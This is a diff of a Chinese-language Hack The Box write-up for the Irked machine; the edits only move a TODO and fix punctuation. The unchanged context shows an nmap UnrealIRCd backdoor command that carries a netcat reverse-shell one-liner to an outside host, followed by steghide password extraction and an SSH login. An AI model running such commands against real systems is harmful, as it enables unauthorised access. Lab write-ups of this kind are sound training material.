@@ -8,6 +8,10 @@ category: Hack The Box
 
 ![](./0.png)
 
+## 0x00 TODO
+
+跑一下 LinEnum.sh 看下能不能跑出 `/home/djmardov/.backup` 文件。
+
 ## 0x01 信息收集
 
 ![](./1.png)
@@ -30,17 +34,16 @@ unrealircd 后门利用，执行反弹 shell 命令拿到普通用户 `ircd`权�
 nmap -d -p6697 --script=irc-unrealircd-backdoor.nse --script-args=irc-unrealircd-backdoor.command='rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.21 4444 >/tmp/f &' 10.10.10.117
 ```
 ![](./6.png)
-`ircd` 并没有 user flag，找到 `djmardov` 用户 `./documents`，无权限打开 `user.txt`，看了 `sudo -l` 没有可以切换的姿势，在 documents 下 `ls -la` 发现隐藏文件 `.backup，cat` 一下是一个 `xxx step backup pw`，像是某个密码，用来 `ssh djmardov@10.10.10.117` 不对，于是 google 一下发现跟 `stephide` 这个工具有关。
+`ircd` 并没有 user flag，找到 `djmardov` 用户 `./documents`，无权限打开 `user.txt`，看了 `sudo -l` 没有可以切换的姿势，在 documents 下 `ls -la` 发现隐藏文件 `.backup`，cat 一下是一个 `xxx step backup pw`，像是某个密码，用来 `ssh djmardov@10.10.10.117` 不对，于是 google 一下发现跟 `stephide` 这个工具有关。
+
 `stephide` 是用于将**文件隐藏在图片、音频**的工具。
 ``` bash
 stephide extract -sf irked.jpg -p password  # 提取文件
-steghide embed -ef secret.txt -cf irked.jpg # 隐藏文件
+steghide embed -ef secret.txt -cf irked.jpg # 隐藏文件，自己要验一下
 # 会被提示输入口令
 Enter passphrase:Re-Enter passphrase:embedding "secret.txt" in "irked.jpg"... done
 ```
-提取出来看到 pass.txt，`ssh djmardov@10.10.10.117` 登录成功，拿到 `user.txt`
-> TODO:
-> 跑一下 LinEnum.sh 看下能不能跑出这个 .backup 文件。
+提取出来看到 pass.txt，`ssh djmardov@10.10.10.117` 登录成功，拿到 `user.txt`。
 
 ## 0x04 提权
 ### 1、Apache JSP webshell 
